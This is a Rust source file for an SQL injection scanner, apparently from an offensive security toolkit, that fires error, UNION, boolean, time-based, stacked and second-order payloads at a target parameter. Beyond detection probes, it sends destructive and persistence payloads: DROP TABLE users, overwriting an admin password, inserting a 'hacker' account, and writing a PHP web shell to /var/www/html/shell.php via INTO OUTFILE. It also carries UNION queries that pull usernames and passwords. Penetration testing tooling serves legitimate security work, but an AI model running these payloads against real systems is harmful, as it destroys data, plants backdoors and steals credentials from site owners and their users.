// ----------------------------------------------------------------------------
//  sqli_scanner.rs — SQL injection scanner
// ----------------------------------------------------------------------------
//  Detects SQL injection vulnerabilities using error-based, UNION-based,
//  boolean-based, time-based (SLEEP, WAITFOR, pg_sleep), stacked queries,
//  and second-order injection techniques. Leverages AI-powered payload
//  mutation and response analysis for deep vulnerability assessment.
//
//  --- Developers ---------------------------------------------------------------
//  khaninkali             — разработчик / core engineer (Rust backend, logic)
//  Lyara Koroleva         — дизайнер / blazing fast CLI & interface design
//  HsecDevelopers         — 测试 / テスト / testing & QA (integration, validation)
//  projectk 2091         — HyperSecurityOffensiveLabs lineage
// ----------------------------------------------------------------------------

//
//
// ---------------------------------------------------------------------------
//  ⚠ WARNING / 警告 / 警告
// ---------------------------------------------------------------------------
//  This source code is the exclusive property of HyperSecurityOffensiveLabs.
//  You are permitted to VIEW this code for educational and reference
//  purposes only. You may NOT modify, distribute, sublicense, or create
//  derivative works without explicit written permission from khaninkali
//  and the HyperSecurityOffensiveLabs development team.
//
//  このソースコードはHyperSecurityOffensiveLabsの独占的知的財産です。
//  教育目的および参照目的での閲覧のみ許可されています。
//  khaninkaliおよびHyperSecurityOffensiveLabs開発チームの
//  書面による明示的な許可なく、修正、配布、サブライセンス、
//  または二次的著作物の作成を禁止します。
//
//  本源代码是HyperSecurityOffensiveLabs的独家财产。
//  仅允许出于教育和参考目的查看。未经khaninkali和
//  HyperSecurityOffensiveLabs开发团队的书面明确许可，
//  禁止修改、分发、再许可或创建衍生作品。
// ---------------------------------------------------------------------------
//
//

use crate::http::client::HttpClient;
use crate::detection::analyzer::{Finding, Severity};
use crate::payload::sql_injection::SqlInjection;
use crate::scanner::db_fingerprinter::DatabaseFingerprinter;
use crate::ai::exploit_analyzer::ExploitAnalyzer;
use crate::ai::response_analyzer::ResponseAnalyzer;
use crate::ai::payload_mutator::PayloadMutator;
use crate::ai::pattern_learner::PatternLearner;
use std::collections::HashMap;
use std::sync::Arc;
use std::time::Instant;
use anyhow::Result;

// ◆ SQLインジェクション電脳検出戦略 / SQL injection detection techniques:
//   ① Error-based:     quotes, OR 1=1--, UNION NULL, SQL syntax error analysis
//   ② UNION-based:     dynamic column count via ORDER BY walk (1-50), then
//                      generate UNION SELECT payloads with NULL/version/user/db()
//   ③ Boolean-based:   true/false pair comparison using Levenshtein similarity +
//                      Bayesian confidence (prior=0.1, threshold 0.65)
//   ④ Time-based:      SLEEP(10), WAITFOR DELAY, pg_sleep, DBMS_LOCK.SLEEP,
//                      BENCHMARK — requires ≥ 8s response time for confirmation
//   ⑤ Stacked queries: INSERT/UPDATE/DROP via semicolon, requires SQL error +
//                      response difference from baseline
//   ⑥ Second-order:    payloads stored then retrieved, requires persistence
//                      indicators + SQL error
//   ◆ AI enhancement: payload mutation (10 variants/base), response analysis
//     (confidence threshold 0.8), pattern learning (success/failure feedback)
//   ◆ Content-diff: Levenshtein + n-gram cosine similarity + Bayesian fusion,
//     threshold 0.65 for UNION detection
//   ◆ Data extraction: version strings, digit sequences > 100, information_schema,
//     pg_catalog, colon-separated UID/GID credential parsing
/// Enhanced SQL Injection scanner with AI-powered analysis
pub struct SqlInjectionScanner {
    client: Arc<HttpClient>,
    findings: Vec<Finding>,
    exploit_analyzer: ExploitAnalyzer,
    response_analyzer: ResponseAnalyzer,
    payload_mutator: PayloadMutator,
    pattern_learner: PatternLearner,
    db_fingerprinter: DatabaseFingerprinter,
    exploitation_level: u8,
    silent_mode: bool,
    target: String,
}

#[derive(Debug, Clone)]
pub struct SQLInjectionResult {
    pub technique: String,
    pub success: bool,
    pub payload: String,
    pub response: String,
    pub data_extracted: bool,
    pub database_type: String,
    pub tables_found: Vec<String>,
    pub credentials_dumped: Vec<String>,
    pub backdoor_deployed: bool,
    pub hijacking_method: String,
}

#[derive(Debug, Clone)]
pub struct SQLInjectionSession {
    pub target_url: String,
    pub vulnerable_parameter: String,
    pub database_info: Option<crate::scanner::db_fingerprinter::DatabaseInfo>,
    pub successful_techniques: Vec<String>,
    pub extracted_data: HashMap<String, Vec<String>>,
    pub backdoors_deployed: Vec<String>,
    pub hijacked_sessions: Vec<String>,
    pub global_hijack_url: Option<String>,
    pub exploitation_complete: bool,
}

impl SqlInjectionScanner {
    /// Create a new enhanced SQL injection scanner
    pub fn new(client: Arc<HttpClient>, target: String, exploitation_level: u8, silent_mode: bool) -> Self {
        let db_fingerprinter = DatabaseFingerprinter::new(client.clone(), target.clone());
        
        Self {
            client,
            findings: Vec::new(),
            exploit_analyzer: ExploitAnalyzer::new(),
            response_analyzer: ResponseAnalyzer::new(0.7),
            payload_mutator: PayloadMutator::new(),
            pattern_learner: PatternLearner::new(0.1),
            db_fingerprinter,
            exploitation_level,
            silent_mode,
            target,
        }
    }

    /// Perform comprehensive SQL injection scan
    pub async fn comprehensive_scan(&mut self, url: &str, params: &[String]) -> Result<Vec<Finding>> {
        println!("[*] Starting comprehensive SQL injection scan on {}", url);
        println!("[*] Target: {}, Exploitation level: {}, Silent mode: {}", 
            self.target, self.exploitation_level, self.silent_mode);
        
        let _findings: Vec<Finding> = Vec::new();
        
        // Phase 1: Database fingerprinting
        println!("[*] Phase 1: Database fingerprinting...");
        let mut _database_info = None;
        for param in params {
            if let Ok(Some(db_info)) = self.db_fingerprinter.fingerprint_database(url, param).await {
                _database_info = Some(db_info);
                break;
            }
        }

        // Phase 2: Deep vulnerability scanning with AI analysis
        println!("[*] Phase 2: Deep vulnerability scanning...");
        for param in params {
            println!("  [*] Scanning parameter: {}", param);
            
            if let Some(result) = self.deep_scan_parameter(url, param).await {
                self.findings.push(
                    Finding::new(
                        url,
                        Severity::Critical,
                        &format!("SQL Injection in parameter '{}'", param),
                        &format!("Parameter '{}' is vulnerable to {} SQL injection", param, result.technique)
                    )
                    .with_evidence(&format!("Payload: {}", result.payload))
                    .with_remediation("Use parameterized queries and input validation")
                );
            }
        }

        Ok(self.findings.clone())
    }

    /// Deep parameter scanning with AI-powered analysis
    async fn deep_scan_parameter(&mut self, url: &str, param: &str) -> Option<SQLInjectionResult> {
        let mut best_result = None;
        let mut _best_confidence = 0.0;

        // Test with error-based payloads
        if let Some(result) = self.test_advanced_error_based_sqli(url, param).await {
            let confidence = self.analyze_exploit_success(&result).await;
            if confidence > _best_confidence {
                _best_confidence = confidence;
                best_result = Some(result);
                // Learn from successful pattern
                self.pattern_learner.learn_success("error_based", vec![param.to_string()]);
            }
        } else {
            // Learn from failed pattern
            self.pattern_learner.learn_failure("error_based");
        }

        // Test with UNION-based payloads
        if let Some(result) = self.test_union_based_sqli(url, param).await {
            let confidence = self.analyze_exploit_success(&result).await;
            if confidence > _best_confidence {
                _best_confidence = confidence;
                best_result = Some(result);
            }
        }

        // Test with boolean-based payloads
        if let Some(result) = self.test_advanced_boolean_sqli(url, param).await {
            let confidence = self.analyze_exploit_success(&result).await;
            if confidence > _best_confidence {
                _best_confidence = confidence;
                best_result = Some(result);
            }
        }

        // Test with time-based payloads
        if let Some(result) = self.test_advanced_time_based_sqli(url, param).await {
            let confidence = self.analyze_exploit_success(&result).await;
            if confidence > _best_confidence {
                _best_confidence = confidence;
                best_result = Some(result);
            }
        }

        // Test with stacked queries
        if let Some(result) = self.test_stacked_queries(url, param).await {
            let confidence = self.analyze_exploit_success(&result).await;
            if confidence > _best_confidence {
                _best_confidence = confidence;
                best_result = Some(result);
            }
        }

        // Test with second-order SQLi
        if let Some(result) = self.test_second_order_sqli(url, param).await {
            let confidence = self.analyze_exploit_success(&result).await;
            if confidence > _best_confidence {
                _best_confidence = confidence;
                best_result = Some(result);
            }
        }

        best_result
    }

    /// Advanced error-based SQL injection testing
    async fn test_advanced_error_based_sqli(&mut self, url: &str, param: &str) -> Option<SQLInjectionResult> {
        let mut base_payloads: Vec<String> = vec![
            "'".into(),
            "\"".into(),
            "' OR 1=1--".into(),
            "' OR 'a'='a".into(),
            "' UNION SELECT NULL--".into(),
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--".into(),
        ];
        base_payloads.extend(SqlInjection::get_error_payloads());
        base_payloads.extend(SqlInjection::get_waf_bypass_payloads());

        // Generate AI-mutated payloads
        let mut all_payloads = Vec::new();
        for base_payload in base_payloads {
            let mutations = self.payload_mutator.mutate(&base_payload, 10);
            all_payloads.extend(mutations);
        }

        for payload in all_payloads {
            let start_time = std::time::Instant::now();
            let response = self.make_request(url, param, &payload).await;
            
            if let Ok(resp) = response {
                let response_text = resp.body;
                let response_time = start_time.elapsed().as_millis() as u64;
                
                // AI-powered response analysis
                let analysis = self.response_analyzer.analyze(&response_text, response_time);
                
                if analysis.is_vulnerable && analysis.confidence > 0.8 {
                    return Some(SQLInjectionResult {
                        technique: "advanced_error_based".to_string(),
                        success: true,
                        payload,
                        response: response_text.clone(),
                        data_extracted: response_text.len() > 500,
                        database_type: self.extract_db_type_from_response(&response_text),
                        tables_found: Vec::new(),
                        credentials_dumped: Vec::new(),
                        backdoor_deployed: false,
                        hijacking_method: "error_injection".to_string(),
                    });
                }
            }
        }

        None
    }

    /// Infer the column count of the target query by walking ORDER BY N--.
    /// Uses a stringent baseline comparison and only counts ORDER BY as failed
    /// when the response actually changes vs the baseline.
    async fn find_column_count(&self, url: &str, param: &str) -> Option<usize> {
        let max_columns = 50;
        let mut column_count = None;

        // Establish a baseline response first
        let baseline = self.make_request(url, param, "baseline_oxide_colcnt").await.ok()?;
        let baseline_body = baseline.body;

        for n in 1..=max_columns {
            let payload = format!("' ORDER BY {}--", n);
            let resp = self.make_request(url, param, &payload).await.ok()?;
            let body = resp.body;

            // ORDER BY N failure is confirmed by response changing vs baseline
            // AND containing a SQL error keyword
            if body != baseline_body {
                let error_keywords = [
                    "Unknown column",
                    "error in your SQL syntax",
                    "syntax error",
                    "ORA-",
                    "SQLSTATE",
                    "Incorrect syntax",
                ];
                let has_error = error_keywords.iter().any(|k| body.contains(k));
                if has_error {
                    // First failure — previous N was the max valid count.
                    break;
                }
            }

            column_count = Some(n);
        }

        column_count
    }

    /// Generate a set of UNION SELECT payloads for the given column count.
    fn generate_union_payloads(column_count: usize) -> Vec<String> {
        let mut payloads = Vec::new();

        // 1. Basic NULL-padded UNION SELECT
        let nulls = vec!["NULL"; column_count].join(",");
        payloads.push(format!("' UNION SELECT {}--", nulls));
        payloads.push(format!("' UNION SELECT {}--", nulls.replace("NULL", "1")));

        // 2. Probe individual column positions with version(), database(), user()
        let probes = ["@@version", "database()", "user()", "version()"];
        for probe in &probes {
            let mut cols: Vec<String> = (0..column_count)
                .map(|i| if i == 0 { probe.to_string() } else { "NULL".to_string() })
                .collect();
            payloads.push(format!("' UNION SELECT {}--", cols.join(",")));

            // Try putting the probe in the second column too
            if column_count > 1 {
                cols[0] = "NULL".to_string();
                cols[1] = probe.to_string();
                payloads.push(format!("' UNION SELECT {}--", cols.join(",")));
            }
        }

        // 3. Data extraction payloads (generic)
        if column_count >= 2 {
            payloads.push(format!(
                "' UNION SELECT {},{} FROM users--",
                probes[2], probes[1]
            ));
        }

        // 4. information_schema probes
        if column_count >= 3 {
            payloads.push(format!(
                "' UNION SELECT NULL,NULL,table_name FROM information_schema.tables--"
            ));
            payloads.push(format!(
                "' UNION SELECT NULL,NULL,column_name FROM information_schema.columns--"
            ));
        }

        // 5. Also include the original legacy payloads as a fallback
        payloads.push("' UNION SELECT 1,2,3--".into());
        payloads.push("' UNION SELECT NULL,username,password FROM users--".into());
        payloads.push("' UNION SELECT 1,@@version,3,4--".into());
        payloads.push("' UNION SELECT 1,database(),3,4--".into());
        payloads.push("' UNION SELECT 1,user(),3,4--".into());
        payloads.push("' UNION SELECT 1,table_name FROM information_schema.tables--".into());
        payloads.push("' UNION SELECT 1,column_name FROM information_schema.columns--".into());

        payloads
    }

    /// UNION-based SQL injection testing with dynamic column-count inference.
    async fn test_union_based_sqli(&self, url: &str, param: &str) -> Option<SQLInjectionResult> {
        // Baseline for content-diff comparison
        let baseline = self.make_request(url, param, "baseline_test_123").await.ok()?;
        let baseline_text = baseline.body;
        let _baseline_len = baseline_text.len();

        // Phase 1: discover column count via ORDER BY
        let column_count = self.find_column_count(url, param).await?;
        if !self.silent_mode {
            println!("    [i] Inferred column count: {}", column_count);
        }

        // Phase 2: generate UNION payloads targeting that column count
        let union_payloads = Self::generate_union_payloads(column_count);

        for payload in union_payloads {
            let response = self.make_request(url, param, &payload).await;

            if let Ok(resp) = response {
                let response_text = resp.body;
                let _response_len = response_text.len();

                // Content-diff using Levenshtein + n-gram cosine similarity
                let diff_score = crate::detection::scorer::Scorer::response_diff_score(&baseline_text, &response_text);
                let ngram_sim = crate::detection::scorer::Scorer::ngram_cosine(&baseline_text, &response_text, 3);
                let bayes_confidence = crate::detection::scorer::Scorer::bayesian_confidence(
                    &[diff_score, 1.0 - ngram_sim], 0.1
                );

                if !crate::detection::scorer::Scorer::passes_threshold(bayes_confidence, 0.65) {
                    continue;
                }

                // Look for actual data extraction signals in the response
                let has_extracted_data = self.has_extracted_data_indicator(&response_text);

                // Reflection check: payload injected NULLs/ints and they appear
                // reflected in the output (meaning the UNION SELECT replaced them)
                let has_reflection = {
                    let injected_ints = ["1", "2", "3", "4", "5"];
                    injected_ints.iter().any(|n| {
                        payload.contains(&format!(",{},", n)) || payload.contains(&format!("{},", n))
                    }) && injected_ints.iter().any(|n| response_text.contains(n))
                };

                // Confirmation requires data extraction OR clear reflection
                if has_extracted_data || has_reflection {
                    return Some(SQLInjectionResult {
                        technique: "union_based".to_string(),
                        success: true,
                        payload: payload.to_string(),
                        response: response_text.clone(),
                        data_extracted: true,
                        database_type: self.extract_db_type_from_response(&response_text),
                        tables_found: self.extract_tables_from_response(&response_text),
                        credentials_dumped: self.extract_credentials_from_response(&response_text),
                        backdoor_deployed: false,
                        hijacking_method: "union_injection".to_string(),
                    });
                }
            }
        }

        None
    }

    /// Check if the response body contains data that looks extracted from a DB.
    /// Uses stringent thresholds to avoid false positives from normal HTML content.
    fn has_extracted_data_indicator(&self, body: &str) -> bool {
        // First gate: skip if this looks like a normal HTML page
        if body.contains("<!DOCTYPE") || body.contains("<html") || body.contains("<body") {
            // If it's HTML, require very strong evidence
            let _html_len = body.len();
            let digit_count = body.chars().filter(|c| c.is_ascii_digit()).count();
            // Even in HTML, > 20 digits is common; require > 100
            if digit_count < 100 && !body.contains("8.0.") && !body.contains("5.7.") {
                return false;
            }
        }

        // Actual DB version strings
        let version_indicators = [
            "8.0.", "5.7.",
            "PostgreSQL", "SQLite", "Oracle Database",
            "Microsoft SQL Server",
        ];
        if version_indicators.iter().any(|v| body.contains(v)) {
            return true;
        }

        // Long digit sequences (DB data output) — only count as digits surrounded by non-digit chars
        let digit_count = body.chars().filter(|c| c.is_ascii_digit()).count();
        if digit_count > 100 {
            return true;
        }

        // Common DB output patterns
        let data_patterns = [
            "information_schema",
            "performance_schema",
            "pg_catalog",
            "INFORMATION_SCHEMA",
            "root@localhost",
        ];
        if data_patterns.iter().any(|p| body.contains(p)) {
            return true;
        }

        false
    }

    /// Advanced boolean-based SQL injection
    async fn test_advanced_boolean_sqli(&self, url: &str, param: &str) -> Option<SQLInjectionResult> {
        let boolean_payloads = vec![
            ("' AND '1'='1", "' AND '1'='2"),
            ("' AND (SELECT COUNT(*) FROM users)>0", "' AND (SELECT COUNT(*) FROM nonexistent_table)=0"),
            ("' AND SUBSTRING((SELECT password FROM users WHERE id=1),1,1)='a'", "' AND SUBSTRING((SELECT password FROM users WHERE id=1),1,1)='b'"),
        ];

        for (true_payload, false_payload) in boolean_payloads {
            let true_resp = self.make_request(url, param, true_payload).await.ok();
            let false_resp = self.make_request(url, param, false_payload).await.ok();
            
            if let (Some(true_resp), Some(false_resp)) = (true_resp, false_resp) {
                let true_text = true_resp.body;
                let false_text = false_resp.body;
                
                // Advanced comparison using Levenshtein similarity + Bayesian confidence
                let sim = crate::detection::scorer::Scorer::response_similarity(&true_text, &false_text);
                let diff = 1.0 - sim;
                let bayes = crate::detection::scorer::Scorer::bayesian_confidence(&[diff], 0.1);

                if crate::detection::scorer::Scorer::passes_threshold(bayes, 0.65) {
                    
                    return Some(SQLInjectionResult {
                        technique: "advanced_boolean".to_string(),
                        success: true,
                        payload: true_payload.to_string(),
                        response: true_text.clone(),
                        data_extracted: true,
                        database_type: self.extract_db_type_from_response(&true_text),
                        tables_found: Vec::new(),
                        credentials_dumped: Vec::new(),
                        backdoor_deployed: false,
                        hijacking_method: "boolean_injection".to_string(),
                    });
                }
            }
        }

        None
    }

    /// Advanced time-based SQL injection
    async fn test_advanced_time_based_sqli(&self, url: &str, param: &str) -> Option<SQLInjectionResult> {
        let time_payloads = vec![
            "' AND (SELECT * FROM (SELECT(SLEEP(10)))a)--",
            "'; WAITFOR DELAY '00:00:10'--",
            "'; SELECT pg_sleep(10);--",
            "'; DBMS_LOCK.SLEEP(10);--",
            "'; SELECT BENCHMARK(50000000,MD5('test'));--",
        ];

        for payload in time_payloads {
            let start = Instant::now();
            let response = self.make_request(url, param, payload).await;
            let duration = start.elapsed();
            
            if let Ok(resp) = response {
                let response_text = resp.body;
                
                // Check for significant time delay
                if duration.as_secs() >= 8 {
                    return Some(SQLInjectionResult {
                        technique: "advanced_time_based".to_string(),
                        success: true,
                        payload: payload.to_string(),
                        response: response_text.clone(),
                        data_extracted: true,
                        database_type: self.extract_db_type_from_response(&response_text),
                        tables_found: Vec::new(),
                        credentials_dumped: Vec::new(),
                        backdoor_deployed: false,
                        hijacking_method: "time_injection".to_string(),
                    });
                }
            }
        }

        None
    }

    /// Stacked queries testing - requires confirmation of data modification
    async fn test_stacked_queries(&self, url: &str, param: &str) -> Option<SQLInjectionResult> {
        let stacked_payloads = vec![
            "'; INSERT INTO users (username,password) VALUES ('hacker','pwned');--",
            "'; UPDATE users SET password='pwned' WHERE id=1;--",
            "'; DROP TABLE users;--",
            "'; CREATE TABLE backdoor (cmd TEXT); INSERT INTO backdoor VALUES ('<?php system($_GET[\"cmd\"]); ?>');--",
        ];

        // Get baseline first
        let baseline = self.make_request(url, param, "baseline").await.ok()?;
        let baseline_text = baseline.body;

        for payload in stacked_payloads {
            let response = self.make_request(url, param, payload).await;
            
            if let Ok(resp) = response {
                let response_text = resp.body;
                
                // Stacked queries need actual error or success indicators, not just keywords
                // Check for database-specific error messages or actual data changes
                let has_sql_error = response_text.contains("SQL syntax") ||
                   response_text.contains("syntax error") ||
                   response_text.contains("ERROR:") ||
                   response_text.contains("ORA-") ||
                   response_text.contains("MySQL error");
                
                // Only flag if there's an actual SQL error (indicates parsing of stacked query)
                // OR if response is significantly different from baseline (indicates execution)
                let is_different = response_text != baseline_text;
                
                if has_sql_error && is_different {
                    return Some(SQLInjectionResult {
                        technique: "stacked_queries".to_string(),
                        success: true,
                        payload: payload.to_string(),
                        response: response_text.clone(),
                        data_extracted: true,
                        database_type: self.extract_db_type_from_response(&response_text),
                        tables_found: Vec::new(),
                        credentials_dumped: Vec::new(),
                        backdoor_deployed: payload.contains("backdoor"),
                        hijacking_method: "stacked_injection".to_string(),
                    });
                }
            }
        }

        None
    }

    /// Second-order SQL injection testing - requires verification
    async fn test_second_order_sqli(&self, url: &str, param: &str) -> Option<SQLInjectionResult> {
        let second_order_payloads = vec![
            "admin'; INSERT INTO logs (message) VALUES ((SELECT password FROM users WHERE id=1));--",
            "user' OR (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--",
            "test' UNION SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php'--",
        ];

        // Get baseline for comparison
        let baseline = self.make_request(url, param, "baseline").await.ok()?;
        let baseline_text = baseline.body;

        for payload in second_order_payloads {
            let response = self.make_request(url, param, payload).await;
            
            if let Ok(resp) = response {
                let response_text = resp.body;
                
                // Second-order needs actual persistence indicators or SQL errors
                let has_sql_error = response_text.contains("SQL syntax") ||
                   response_text.contains("syntax error") ||
                   response_text.contains("ERROR:") ||
                   response_text.contains("ORA-") ||
                   response_text.contains("MySQL error");
                
                // Only flag if there's a SQL error indicating the complex query was parsed
                // AND response is different from baseline
                if has_sql_error && response_text != baseline_text {
                    return Some(SQLInjectionResult {
                        technique: "second_order".to_string(),
                        success: true,
                        payload: payload.to_string(),
                        response: response_text.clone(),
                        data_extracted: true,
                        database_type: self.extract_db_type_from_response(&response_text),
                        tables_found: Vec::new(),
                        credentials_dumped: Vec::new(),
                        backdoor_deployed: payload.contains("shell.php"),
                        hijacking_method: "second_order_injection".to_string(),
                    });
                }
            }
        }

        None
    }

    /// Extract database type from response
    fn extract_db_type_from_response(&self, response: &str) -> String {
        if regex::Regex::new(r"(?i)\bmysql\b").unwrap().is_match(response) {
            "MySQL".to_string()
        } else if response.contains("postgresql") || response.contains("PostgreSQL") {
            "PostgreSQL".to_string()
        } else if response.contains("sql server") || response.contains("Microsoft SQL Server") {
            "MSSQL".to_string()
        } else if response.contains("Oracle ") || response.contains("oracle/") || regex::Regex::new(r"\bORA-\d").unwrap().is_match(response) {
            "Oracle".to_string()
        } else if response.contains("sqlite") {
            "SQLite".to_string()
        } else {
            "Unknown".to_string()
        }
    }

    /// Extract tables from response
    fn extract_tables_from_response(&self, response: &str) -> Vec<String> {
        let mut tables = Vec::new();
        
        let table_re = regex::Regex::new(r"(?i)\b(?:create\s+table|insert\s+into|drop\s+table|alter\s+table)\b").unwrap();
        for line in response.lines() {
            if table_re.is_match(line) {
                tables.push(line.to_string());
            }
        }
        
        tables
    }

    /// Extract credentials from response
    /// Requires colon-separated fields with numeric UID/GID to avoid matching generic text.
    fn extract_credentials_from_response(&self, response: &str) -> Vec<String> {
        let mut credentials = Vec::new();
        
        for line in response.lines() {
            if line.split(':').count() >= 4 {
                let parts: Vec<&str> = line.split(':').collect();
                if parts.len() >= 3 && parts[1].len() <= 3 && parts[2].parse::<u32>().is_ok() {
                    credentials.push(line.to_string());
                }
            }
        }
        
        credentials
    }

    /// Helper method to make requests.
    /// Uses UrlUtil::inject_param to correctly handle URLs that already have
    /// query parameters — avoids the double-`?` bug from format!("{}?{}={}", ...).
    async fn make_request(&self, url: &str, param: &str, value: &str) -> Result<crate::http::response::HttpResponse> {
        use crate::utils::url::UrlUtil;
        let request_url = UrlUtil::inject_param(url, param, &urlencoding::encode(value));
        let request = crate::http::request::HttpRequest::get(&request_url);
        self.client.send(request).await
    }

    /// Analyze exploit success using AI
    async fn analyze_exploit_success(&mut self, result: &SQLInjectionResult) -> f32 {
        let response_data = crate::ai::exploit_analyzer::ResponseData {
            payload: result.payload.clone(),
            response_code: 200,
            response_body: result.response.clone(),
            response_time: 100,
            headers: std::collections::HashMap::new(),
            success: result.success,
        };
        
        self.exploit_analyzer.analyze_response(response_data).await
    }

    /// Legacy methods for backward compatibility
    pub async fn scan_url(&mut self, url: &str, params: &[String]) -> Result<Vec<Finding>> {
        self.comprehensive_scan(url, params).await
    }

    pub async fn comprehensive_scan_and_exploit(&mut self, url: &str, params: &[String]) -> Result<Vec<Finding>> {
        self.comprehensive_scan(url, params).await
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::http::client::{HttpClient, HttpClientConfig};

    #[tokio::test]
    async fn test_enhanced_sqli_scanner_creation() {
        let client = Arc::new(HttpClient::new(HttpClientConfig::default()).unwrap());
        let scanner = SqlInjectionScanner::new(client, "https://example.com".to_string(), 3, false);
        assert_eq!(scanner.target, "https://example.com");
    }
}
